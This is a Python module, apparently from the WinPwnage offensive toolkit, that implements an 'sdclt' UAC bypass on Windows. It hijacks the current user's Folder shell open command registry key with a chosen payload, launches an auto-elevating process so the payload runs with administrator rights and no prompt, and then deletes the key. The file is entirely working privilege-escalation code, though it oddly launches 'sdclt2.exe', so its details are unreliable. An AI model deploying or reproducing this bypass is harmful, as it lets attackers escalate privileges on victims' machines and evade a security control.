import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

sdclt_info = {
	"Description": "Bypass UAC using sdclt and registry key manipulation",
	"Id": "16",
	"Type": "UAC bypass",
	"Fixed In": "999999" if not information().uac_level() == 4 else "0",
	"Works From": "14393",
	"Admin": False,
	"Function Name": "sdclt_uacbypass",
	"Function Payload": True,
}


def sdclt_uacbypass(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\Folder\\shell\\open\\command"

		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payload, create=True):
			if registry().modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
				print_success("Successfully created Default and DelegateExecute key containing payload ({payload})".format(payload=os.path.join(payload)))
			else:
				print_error("Unable to create registry keys")
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)
	
		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("sdclt2.exe"):
				print_success("Successfully spawned process ({})".format(payload))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				return False

		time.sleep(5)

		if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
			print_success("Successfully cleaned up, enjoy!")
		else:
			print_error("Unable to cleanup")
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False